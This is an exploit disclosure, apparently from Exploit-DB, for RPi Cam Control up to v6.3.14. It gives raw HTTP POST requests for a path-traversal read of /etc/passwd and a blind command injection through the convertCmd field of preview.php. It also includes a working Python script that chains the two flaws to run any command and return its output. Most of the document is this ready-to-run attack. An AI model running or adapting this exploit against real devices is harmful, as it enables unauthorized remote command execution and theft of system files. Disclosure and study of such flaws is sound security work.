#####
# Exploit Title: RPi Cam Control <= v6.3.14 (RCE) Multiple Vulnerabilities - preview.php
# Date: 16/08/2017
# Exploit Author: Alexander Korznikov
# Vendor Homepage: https://github.com/silvanmelchior/RPi_Cam_Web_Interface
# Software Link: https://github.com/silvanmelchior/RPi_Cam_Web_Interface
# Version: <= v6.3.14
# Date 16/08/2017
#
# A web interface for the RPi Cam
# Vendor github: https://github.com/silvanmelchior/RPi_Cam_Web_Interface
#
# Bug Discovered by Alexander Korznikov:
#     www.exploit-db.com/author/?a=8722
#     www.linkedin.com/in/nopernik
#     www.korznikov.com
#
# RPi Cam Control <= v6.3.14 is vulnerable to Local File Read and Blind Command Injection.
#
#
# Local File Read (get /etc/passwd file):
# ----------------
# POST /preview.php HTTP/1.1
# Host: 127.0.0.1
# Content-Type: application/x-www-form-urlencoded
# Connection: close
# Content-Length: 80
#
# download1=../../../../../../../../../../../../../../../../etc/passwd.v0000.t
#
#
# Blind Command Injection:
# ------------------
# POST /preview.php HTTP/1.1
# Host: 127.0.0.1
# Content-Type: application/x-www-form-urlencoded
# Connection: close
# Content-Length: 52
#
# convert=none&convertCmd=$(COMMAND_TO_EXECUTE)
#
#
# Blind Command Injection can be used with Local File Read to properly get the output of injected command.
#
# Proof of Concept Code:
#####

#!/usr/bin/python

import requests
import sys
if not len(sys.argv[2:]):
   print "Usage: RPi-Cam-Control-RCE.py 127.0.0.1 'cat /etc/passwd'"
   exit(1)

def GET(target, rfile):
   res = requests.post("http://%s/preview.php" % target,
        headers={"Content-Type": "application/x-www-form-urlencoded", "Connection": "close"},
        data={"download1": "../../../../../../../../../../../../../../../../{}.v0000.t".format(rfile)})
   return res.content

def RCE(target, command):
   requests.post("http://%s/preview.php" % target,
        headers={"Content-Type": "application/x-www-form-urlencoded", "Connection": "close"},
        data={"convert": "none", "convertCmd": "$(%s > /tmp/output.txt)" % command})
   return GET(target,'/tmp/output.txt')

target = sys.argv[1]
command = sys.argv[2]

print RCE(target,command)
